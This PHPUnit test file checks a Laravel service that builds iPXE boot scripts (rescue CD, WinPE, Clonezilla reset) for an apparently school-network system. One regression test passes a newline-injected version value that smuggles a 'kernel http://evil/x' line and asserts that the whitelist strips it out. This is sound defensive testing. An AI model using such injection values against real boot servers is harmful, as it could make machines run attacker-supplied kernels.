<?php

declare(strict_types=1);

namespace Tests\Unit\Ipxe\Services;

use App\Ipxe\Enums\IpxeAdminAction;
use App\Ipxe\Services\IpxeActionResolver;
use App\Models\Workstation;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Config;
use PHPUnit\Framework\Attributes\Test;
use Tests\Support\IpxeSchemaBootstrapper;
use Tests\TestCase;

/**
 * Story 3.2 — AC1.2 / T1.6.
 *
 * Tests unitaires du résolveur d'actions whitelistées
 * {@see IpxeActionResolver}.
 */
class IpxeActionResolverTest extends TestCase
{
    private IpxeActionResolver $resolver;

    protected function setUp(): void
    {
        parent::setUp();
        IpxeSchemaBootstrapper::bootstrap();
        $this->resolver = $this->app->make(IpxeActionResolver::class);
    }

    private function makeRequest(array $params = []): Request
    {
        // URL absolue : `Request::create('/ipxe/...')` parserait avec
        // `http://localhost` et un `server->set('HTTP_HOST', ...)` ultérieur
        // ne propage pas au headers bag — `getSchemeAndHttpHost()` resterait
        // localhost. On passe l'host directement dans l'URL pour qu'il soit
        // cohérent sur server + headers + parsed-host.
        $request = Request::create('http://se4fs.lan/ipxe/action/rescuecd', 'POST', $params);
        $request->server->set('REMOTE_ADDR', '192.168.1.42');

        return $request;
    }

    #[Test]
    public function it_renders_rescuecd_with_kernel_sysresccd_url(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel http://se4fs.test/ipxe/sysresccd/boot/x86_64/vmlinuz', $body);
        self::assertStringContainsString('archisobasedir=sysresccd', $body);
        self::assertStringContainsString('initrd --name intel_ucode.img', $body);
        self::assertStringContainsString('initrd --name amd_ucode.img', $body);
        self::assertStringContainsString('initrd --name initram.igz', $body);
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_renders_winpe_with_wimboot_and_4_initrds(): void
    {
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel Win10/wimboot', $body);
        self::assertStringContainsString('initrd --name winpeshl.ini', $body);
        self::assertStringContainsString('initrd --name install.bat Win10/repair.bat.php##params', $body);
        self::assertStringContainsString('initrd --name diskpart.txt Win10/diskpart.php##params', $body);
        self::assertStringContainsString('initrd --name boot.wim', $body);
        // 2 blocs `params` + 2 `iseq ${platform} efi && param bios uefi || param bios legacy`.
        self::assertSame(2, substr_count($body, 'iseq ${platform} efi && param bios uefi || param bios legacy'));
        self::assertSame(2, substr_count($body, "params\n"));
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_renders_factory_reset_with_clonezilla_kernel_and_restoreparts(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::FactoryReset, null, $request);

        self::assertStringStartsWith('#!ipxe', $body);
        self::assertStringContainsString('kernel http://se4fs.test/ipxe/clonezilla/vmlinuz', $body);
        self::assertStringContainsString('ocs_prerun="mount -t auto /dev/sda2 /home/partimag/"', $body);
        self::assertStringContainsString('ocs_live_run="ocs-sr -e1 auto -e2 -r -j2 -p reboot restoreparts savesda1 sda1"', $body);
        self::assertStringContainsString('fetch=http://se4fs.test/ipxe/clonezilla/filesystem.squashfs', $body);
        self::assertStringContainsString('initrd --name initram.igz http://se4fs.test/ipxe/clonezilla/initrd.img', $body);
        self::assertStringEndsWith("boot\n", $body);
    }

    #[Test]
    public function it_injects_se4install_passwd_from_config_for_rescuecd(): void
    {
        Config::set('sambaedu.se4install_passwd', 's3cr3t-test-pass');
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString('rootpass=s3cr3t-test-pass', $body);
    }

    #[Test]
    public function it_resolves_os_url_from_config_when_set(): void
    {
        Config::set('ipxe.actions.os_url', 'http://override.example/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString('http://override.example/ipxe/sysresccd/boot/x86_64/vmlinuz', $body);
        // L'host de la request doit être ignoré quand override.
        self::assertStringNotContainsString('http://se4fs.lan/ipxe/sysresccd', $body);
    }

    #[Test]
    public function it_resolves_os_url_from_request_scheme_and_host_when_config_empty(): void
    {
        Config::set('ipxe.actions.os_url', null);

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        // Doit utiliser se4fs.lan (from HTTP_HOST) suffixé /ipxe.
        self::assertStringContainsString('http://se4fs.lan/ipxe/sysresccd', $body);
    }

    #[Test]
    public function it_sanitizes_ascii_in_workstation_name_and_uuid(): void
    {
        Config::set('ipxe.actions.os_url', 'http://se4fs.test/ipxe');

        $ws = Workstation::create([
            'name' => "PC-ECOLE\xc3\xa9-101",  // contient `é` UTF-8
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'status' => 'active',
        ]);

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, $ws, $request);

        // Tous les bytes doivent être ASCII (0-127).
        for ($i = 0, $len = strlen($body); $i < $len; $i++) {
            self::assertLessThan(128, ord($body[$i]));
        }
    }

    /* ------------------------------------------------------------------
     * Story 3.2 — Correctif review #2 / #B2 (whitelist version winpe)
     * ------------------------------------------------------------------ */

    #[Test]
    public function it_rejects_invalid_version_and_falls_back_to_default(): void
    {
        // Fix review #B2 — test injection iPXE. Sans whitelist, le firmware
        // exécutait la ligne `kernel http://evil/x` injectée via newline.
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'version' => "Win11\nkernel http://evil/x",
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        // Le body NE DOIT PAS contenir la ligne kernel attaquante.
        self::assertStringNotContainsString('kernel http://evil', $body);
        self::assertStringNotContainsString("\nkernel http://evil/x", $body);
        // Le body DOIT contenir le fallback DEFAULT_WIN_VERSION='Win11' pur.
        self::assertStringContainsString('initrd --name BCD Win11/boot/bcd', $body);
        self::assertStringContainsString('initrd --name boot.wim Win11/sources/boot.wim', $body);
    }

    #[Test]
    public function it_accepts_whitelisted_version(): void
    {
        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
            'version' => 'Win10',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Winpe, null, $request);

        // Win10 doit être propagé tel quel dans le template winpe.
        self::assertStringContainsString('param version Win10', $body);
        self::assertStringContainsString('initrd --name BCD Win10/boot/bcd', $body);
        self::assertStringContainsString('initrd --name boot.wim Win10/sources/boot.wim', $body);
    }

    #[Test]
    public function it_builds_autorun_url_with_mac_and_uuid_interpolated(): void
    {
        Config::set('ipxe.actions.script_url', 'http://script.example/ipxe');

        $request = $this->makeRequest([
            'mac' => 'aa:bb:cc:dd:ee:ff',
            'uuid' => '12345678-1234-1234-1234-123456789abc',
        ]);

        $body = $this->resolver->resolve(IpxeAdminAction::Rescuecd, null, $request);

        self::assertStringContainsString(
            'ar_source=http://script.example/ipxe/sysrescuecd/autorun.php?mac=aa%3Abb%3Acc%3Add%3Aee%3Aff&uuid=12345678-1234-1234-1234-123456789abc',
            $body,
        );
    }
}
